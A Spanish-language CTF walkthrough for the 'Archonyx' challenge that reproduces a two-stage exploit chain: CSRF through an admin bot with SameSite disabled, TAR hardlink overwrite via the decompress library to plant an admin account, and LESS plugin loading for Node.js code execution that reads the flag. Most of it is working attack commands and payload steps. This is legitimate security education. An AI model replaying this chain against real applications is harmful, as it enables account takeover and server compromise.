# Archonyx, Walkthrough reproducible

> Este documento describe la reproducción operativa del exploit en un entorno autorizado y aislado.  
> Para el análisis del razonamiento y las primitivas, consulta [el artículo técnico](../article/archonyx-analysis.md).

## 1. Resumen de la cadena

La explotación se divide en dos stages:

```text
Stage 1
/report
→ bot autenticado
→ Chromium con protecciones SameSite deshabilitadas
→ CSRF contra /api/fetch
→ extracción TAR antes de validación
→ hardlink absoluto a /app/data/db.json
→ sobrescritura de la base de datos
→ acceso ledgermaster

Stage 2
/report
→ segunda descarga autenticada
→ hardlink absoluto a /app/public/transitions.js
→ plugin LESS controlado
→ ejecución Node.js
→ /readflag
→ flag
```

## 2. Requisitos

- Python 3
- Node.js
- Docker
- una instancia local o autorizada de Archonyx
- un servidor HTTP accesible por el bot
- los scripts incluidos en este repositorio

Estructura relevante:

```text
scripts/
├── build_stage1_tar.py
├── build_stage2_tar.py
└── marker-plugin.js

payloads/
├── stage1.example.html
└── stage2.example.html
```

## 3. Levantar Archonyx localmente

Desde el directorio original del reto:

```bash
docker build -t archonyx-local .
```

Ejecutar el contenedor:

```bash
docker run --rm \
  --name archonyx-local \
  -p 1337:1337 \
  archonyx-local
```

La aplicación escucha en:

```text
http://127.0.0.1:1337
```

El contenedor ejecuta:

```text
node data/seed.js
node server.js
```

El proceso web corre como el usuario `ctf`.

## 4. Superficie relevante

Las rutas importantes eran:

```text
POST /report
POST /api/fetch
POST /api/manifest
POST /enter
GET  /ledgermaster/
POST /ledgermaster/render
```

`/api/fetch` exige autenticación:

```javascript
router.post(
  '/fetch',
  resolveAuth,
  api.uploadUrl
);
```

El panel administrativo exige el rol `ledgermaster`:

```javascript
router.use(
  requireRole('ledgermaster')
);

router.post(
  '/render',
  admin.setCertificationTemplate
);
```

## 5. Configuración del bot y política SameSite

El bot genera un JWT válido para el usuario `bot`:

```javascript
const token = jwt.sign(
  {
    username: 'bot',
    role: 'warden'
  },
  jwtSecret
);
```

Después inicia Chromium con estas opciones:

```javascript
browser = await puppeteer.launch({
  headless: 'new',
  args: [
    '--no-sandbox',
    '--disable-setuid-sandbox',
    '--disable-features=SameSiteByDefaultCookies,CookiesWithoutSameSiteMustBeSecure',
    '--disable-popup-blocking',
  ],
});
```

La opción crítica es:

```text
--disable-features=SameSiteByDefaultCookies,CookiesWithoutSameSiteMustBeSecure
```

El bot deshabilita explícitamente las protecciones SameSite modernas de Chromium.

A continuación instala la cookie JWT para el origen interno:

```javascript
await page.setCookie({
  name: 'token',
  value: token,
  url: `http://${appHost}:${port}/`,
  path: '/',
  httpOnly: true,
});
```

La cookie no configura un atributo `SameSite`.

Finalmente, el bot navega hacia la URL enviada a `/report`:

```javascript
await page.goto(
  url,
  {
    waitUntil: 'load',
    timeout: 10000
  }
);
```

Este comportamiento permite que una página externa envíe un formulario `POST` hacia el origen interno incluyendo la cookie autenticada.

Con la política SameSite moderna activa, un POST cross-site de este tipo normalmente no transportaría una cookie tratada como `Lax`.

La primera primitiva depende, por tanto, de esta combinación:

```text
JWT válido
+
cookie instalada para el origen interno
+
protecciones SameSite deshabilitadas
+
ausencia de defensa CSRF
=
POST cross-site autenticado
```

## 6. Diferencia entre subida directa y descarga remota

La subida directa validaba el archivo antes de extraerlo.

La descarga remota utilizaba:

```javascript
async function downloadAndExtract(
  url,
  extractDir
) {
  fs.mkdirSync(
    extractDir,
    {
      recursive: true
    }
  );

  await download(
    url,
    extractDir,
    {
      extract: true
    }
  );
}
```

Después de extraer, la aplicación validaba los archivos de forma asíncrona.

El efecto lateral del extractor ocurría antes de la limpieza.

## 7. Versiones verificadas

El reto utilizaba:

```text
decompress 4.2.1
decompress-tar 4.1.1
```

`decompress-tar` preservaba el `linkname` de las entradas TAR:

```javascript
if (
  header.type === 'symlink' ||
  header.type === 'link'
) {
  file.linkname = header.linkname;
}
```

`decompress` validaba el destino, pero utilizaba directamente el origen del hardlink:

```javascript
if (x.type === 'link') {
  return fsP.link(
    x.linkname,
    dest
  );
}
```

La escritura posterior se realizaba mediante:

```javascript
fsP.writeFile(
  dest,
  x.data,
  {
    mode
  }
);
```

`writeFile` truncaba y reescribía el archivo existente. Como `pivot` compartía inode con el archivo objetivo, la escritura modificaba también ese archivo.

## 8. Construcción de Stage 1

Stage 1 sobrescribe:

```text
/app/data/db.json
```

Generar el TAR:

```bash
python3 scripts/build_stage1_tar.py \
  --output stage1.tar
```

El archivo contiene dos entradas con el mismo nombre:

```text
pivot → hardlink a /app/data/db.json
pivot → archivo regular con JSON controlado
```

Comprobar la estructura:

```bash
tar -tvf stage1.tar
```

La salida esperada es equivalente a:

```text
pivot link to app/data/db.json
pivot
```

El JSON introduce:

- usuario `admin`;
- rol `ledgermaster`;
- estado `verified`;
- contraseña conocida;
- usuario `bot` preservado.

La contraseña utilizada es:

```text
ArchonyxAdmin123!
```

Su hash bcrypt es:

```text
$2b$10$dsC9VYxPVzqNFYGyoPn9Su0hIMeGcOKKsLkJzOhREKROG8COtvT5a
```

Verificación:

```bash
node - <<'NODE'
const bcrypt = require('bcryptjs');

const password =
  'ArchonyxAdmin123!';

const hash =
  '$2b$10$dsC9VYxPVzqNFYGyoPn9Su0hIMeGcOKKsLkJzOhREKROG8COtvT5a';

console.log(
  bcrypt.compareSync(
    password,
    hash
  )
);
NODE
```

Resultado esperado:

```text
true
```

## 9. Preparar el payload HTML de Stage 1

Copiar el ejemplo:

```bash
cp \
  payloads/stage1.example.html \
  stage1.html
```

Sustituir:

```text
https://PUBLIC_HOST/stage1.tar
```

por la URL pública real donde se servirá el TAR.

El formulario envía:

```text
POST http://127.0.0.1:1337/api/fetch
```

El envío sustituye el documento principal y provoca una navegación `POST` hacia el origen interno.

Como el bot ejecuta Chromium con las protecciones SameSite deshabilitadas y ya ha instalado la cookie JWT para ese origen, la petición incluye la sesión autenticada.

## 10. Servir los payloads

Crear un directorio temporal:

```bash
mkdir -p serve

cp \
  stage1.tar \
  stage1.html \
  serve/
```

Levantar un servidor HTTP:

```bash
cd serve

python3 -m http.server 8000
```

Exponerlo mediante el mecanismo autorizado que se esté utilizando.

Verificar desde otro terminal:

```bash
curl -I \
  https://PUBLIC_HOST/stage1.html

curl -I \
  https://PUBLIC_HOST/stage1.tar
```

Ambos deben devolver `200`.

## 11. Activar el bot

Definir el objetivo:

```bash
export TARGET='http://HOST:PORT'
```

Enviar la URL controlada:

```bash
curl -sS \
  -X POST \
  "$TARGET/report" \
  --data-urlencode \
    'body=Review this manifest.' \
  --data-urlencode \
    'url=https://PUBLIC_HOST/stage1.html'
```

En el servidor HTTP deberían aparecer:

```text
GET /stage1.html
GET /stage1.tar
```

Eso confirma:

1. que el bot visitó la página;
2. que el formulario ejecutó `/api/fetch` con su sesión;
3. que Archonyx descargó y extrajo el TAR.

## 12. Login como ledgermaster

Guardar la cookie:

```bash
rm -f archonyx.cookies
```

Autenticarse:

```bash
curl -i -sS \
  -c archonyx.cookies \
  -X POST \
  "$TARGET/enter" \
  --data-urlencode \
    'username=admin' \
  --data-urlencode \
    'password=ArchonyxAdmin123!'
```

La respuesta esperada incluye:

```text
HTTP/1.1 302 Found
Set-Cookie: token=...
Location: /ledger
```

Confirmar el acceso:

```bash
curl -sS \
  -b archonyx.cookies \
  "$TARGET/ledgermaster/" |
grep -o \
  'Ledgermaster[^<]*'
```

## 13. Validación inocua de LESS

Antes de ejecutar `/readflag`, validar la carga de plugins localmente.

Copiar el plugin:

```bash
docker cp \
  scripts/marker-plugin.js \
  archonyx-local:/tmp/marker-plugin.js
```

Eliminar un marcador previo:

```bash
docker exec \
  archonyx-local \
  rm -f \
  /tmp/archonyx-less-marker
```

Enviar el payload LESS:

```bash
curl -i -sS \
  -b archonyx.cookies \
  -H 'Content-Type: application/json' \
  --data-binary '{
    "css":
      "@plugin \"/tmp/marker-plugin.js\";\n#preview-badge { color: red; }"
  }' \
  "$TARGET/ledgermaster/render"
```

La respuesta esperada es:

```json
{"data":"Seal cast"}
```

Comprobar el marcador:

```bash
docker exec \
  archonyx-local \
  sh -c '
    ls -l /tmp/archonyx-less-marker
    cat /tmp/archonyx-less-marker
  '
```

Resultado esperado:

```text
LESS_PLUGIN_EXECUTED
```

Esto demuestra ejecución de JavaScript en el servidor como usuario `ctf`.

## 14. Construcción de Stage 2

Stage 2 sobrescribe:

```text
/app/public/transitions.js
```

Generar el TAR:

```bash
python3 scripts/build_stage2_tar.py \
  --output stage2.tar
```

Comprobar:

```bash
tar -tvf stage2.tar
```

La estructura esperada es:

```text
pivot → hardlink a /app/public/transitions.js
pivot → plugin JavaScript
```

El plugin ejecuta:

```text
/readflag
```

y guarda la salida en:

```text
/app/public/archonyx-proof.txt
```

## 15. Preparar el payload HTML de Stage 2

Copiar el ejemplo:

```bash
cp \
  payloads/stage2.example.html \
  stage2.html
```

Sustituir:

```text
https://PUBLIC_HOST/stage2.tar
```

por la URL pública real.

Copiar ambos archivos al servidor:

```bash
cp \
  stage2.tar \
  stage2.html \
  serve/
```

Verificar:

```bash
curl -I \
  https://PUBLIC_HOST/stage2.html

curl -I \
  https://PUBLIC_HOST/stage2.tar
```

## 16. Entregar Stage 2

Enviar la segunda URL al bot:

```bash
curl -sS \
  -X POST \
  "$TARGET/report" \
  --data-urlencode \
    'body=Review the second manifest.' \
  --data-urlencode \
    'url=https://PUBLIC_HOST/stage2.html'
```

En los logs del servidor deberían aparecer:

```text
GET /stage2.html
GET /stage2.tar
```

## 17. Activar el plugin sobrescrito

Enviar el CSS al panel administrativo:

```bash
curl -sS \
  -b archonyx.cookies \
  -H 'Content-Type: application/json' \
  --data-binary '{
    "css":
      "@plugin \"/app/public/transitions.js\";\n#preview-badge { color: red; }"
  }' \
  "$TARGET/ledgermaster/render"
```

Respuesta esperada:

```json
{"data":"Seal cast"}
```

## 18. Recuperar la flag

Leer el archivo publicado:

```bash
curl -sS \
  "$TARGET/archonyx-proof.txt"
```

Resultado:

```text
HTB{wh4t_th3_l3dg3r_cl34rs_th3_c04st_b3l13v3s_7905347203642d5c8c3429368cc230f6}
```

## 19. Por qué funciona `/readflag`

El contenedor mueve la flag a:

```text
/flag.txt
```

y la protege:

```dockerfile
RUN mv /app/flag.txt /flag.txt \
    && chown root:root /flag.txt \
    && chmod 400 /flag.txt
```

La aplicación corre como `ctf`, por lo que no puede leerla directamente.

Sin embargo, el contenedor instala:

```dockerfile
COPY readflag /readflag
RUN chmod 4755 /readflag
```

El bit SUID permite que `/readflag` acceda al archivo con privilegios efectivos de root.

La última transición es:

```text
RCE como ctf
→ ejecutar /readflag
→ lectura de /flag.txt
```

## 20. Troubleshooting

### El bot no solicita la página

Comprobar:

```bash
curl -I \
  https://PUBLIC_HOST/stage1.html
```

Revisar que la URL enviada a `/report` utilice `http://` o `https://`.

### La página se solicita, pero no el TAR

Revisar el valor del campo `url` dentro del HTML.

Confirmar que apunta a:

```text
https://PUBLIC_HOST/stage1.tar
```

o:

```text
https://PUBLIC_HOST/stage2.tar
```

### El POST llega sin autenticación

Confirmar que la reproducción utiliza el bot original del reto.

El bot debe iniciar Chromium con:

```text
--disable-features=SameSiteByDefaultCookies,CookiesWithoutSameSiteMustBeSecure
```

Y debe instalar previamente la cookie JWT mediante `page.setCookie`.

Sin esa configuración, un POST cross-site moderno puede no incluir la cookie.

### El login no funciona

Comprobar que Stage 1 fue descargado y extraído.

Verificar el hash:

```bash
node - <<'NODE'
const bcrypt = require('bcryptjs');

console.log(
  bcrypt.compareSync(
    'ArchonyxAdmin123!',
    '$2b$10$dsC9VYxPVzqNFYGyoPn9Su0hIMeGcOKKsLkJzOhREKROG8COtvT5a'
  )
);
NODE
```

### LESS responde, pero no aparece el archivo

Confirmar primero con `marker-plugin.js`.

Después revisar que Stage 2 haya sobrescrito:

```text
/app/public/transitions.js
```

### Errores 530 o túnel inaccesible

Verificar:

```bash
curl -I \
  https://PUBLIC_HOST/stage1.html

curl -I \
  https://PUBLIC_HOST/stage1.tar
```

Un túnel expirado puede producir falsos negativos aunque el exploit sea correcto.

## 21. Limpieza

Eliminar artefactos locales:

```bash
rm -f \
  stage1.tar \
  stage2.tar \
  stage1.html \
  stage2.html \
  archonyx.cookies
```

Detener el contenedor:

```bash
docker stop archonyx-local
```

## 22. Referencias internas

- [Análisis técnico](../article/archonyx-analysis.md)
- [Generador de Stage 1](../scripts/build_stage1_tar.py)
- [Generador de Stage 2](../scripts/build_stage2_tar.py)
- [Plugin inocuo de validación](../scripts/marker-plugin.js)
- [Payload HTML de Stage 1](../payloads/stage1.example.html)
- [Payload HTML de Stage 2](../payloads/stage2.example.html)
